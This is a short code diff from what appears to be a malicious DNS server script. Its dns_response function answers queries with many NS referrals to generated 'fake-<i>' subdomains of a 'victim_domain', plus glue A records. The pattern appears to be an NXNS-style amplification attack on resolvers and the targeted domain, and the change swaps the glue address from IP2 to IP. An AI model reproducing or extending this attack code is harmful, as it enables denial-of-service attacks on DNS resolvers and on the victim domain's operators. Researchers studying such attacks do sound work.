@@ -86,7 +86,7 @@ def dns_response(data, client_ip):
             for rdata in referral_responses:
                 reply.add_auth(RR(rname=DomainName(qn), rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
                 referral_domain = DomainName('fake-' + str(i) + '.' + victim_domain)
-                reply.add_ar(RR(rname=referral_domain, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP2)))
+                reply.add_ar(RR(rname=referral_domain, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP)))
         else:
             reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP)))
     print("---- Reply:\n", reply)
